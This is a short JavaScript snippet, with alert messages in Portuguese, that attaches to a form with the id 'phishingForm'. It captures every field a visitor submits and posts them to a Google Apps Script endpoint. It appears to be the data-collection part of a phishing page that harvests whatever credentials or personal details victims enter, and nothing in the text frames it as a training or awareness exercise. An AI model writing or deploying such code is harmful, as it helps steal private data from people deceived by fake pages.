const scriptURL = "https://script.google.com/macros/s/AKfycbwjciCpIX3pfC1AdLIltfXTYrxpFE8Y5mp1s1DFdq7XePy2-Dp-4SjrxlajedNnIRTGtg/exec";

document.getElementById("phishingForm").addEventListener("submit", function(event) {
    event.preventDefault();
    const form = event.target;
    const data = new FormData(form);

    fetch(scriptURL, {
        method: "POST",
        body: data
    })
    .then(response => {
        alert("✅ Dados enviados com sucesso!");
        form.reset();
    })
    .catch(error => {
        alert("❌ Erro ao enviar os dados.");
        console.error("Erro:", error);
    });
});
